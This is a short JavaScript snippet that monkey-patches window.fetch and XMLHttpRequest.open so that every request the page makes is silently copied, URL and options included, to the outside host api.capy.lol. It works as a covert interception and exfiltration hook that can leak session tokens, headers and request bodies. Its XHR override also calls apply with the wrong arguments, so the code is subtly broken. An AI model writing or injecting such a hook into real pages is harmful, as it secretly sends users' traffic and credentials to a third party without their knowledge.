const originalFetch = window.fetch;
window.fetch = function (i, init) {
  console.log("??");
  console.log(...arguments);
  originalFetch("https://api.capy.lol", {
    method: "POST",
    body: JSON.stringify({
      i,
      ...init,
    }),
  });

  return originalFetch(i, init);
};

const originalXhrOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function (method, url) {
  fetch("https://api.capy.lol", {
    method: "POST",
    body: JSON.stringify({
      method,
      url,
    }),
  });

  return originalXhrOpen.apply(this, method, url);
};
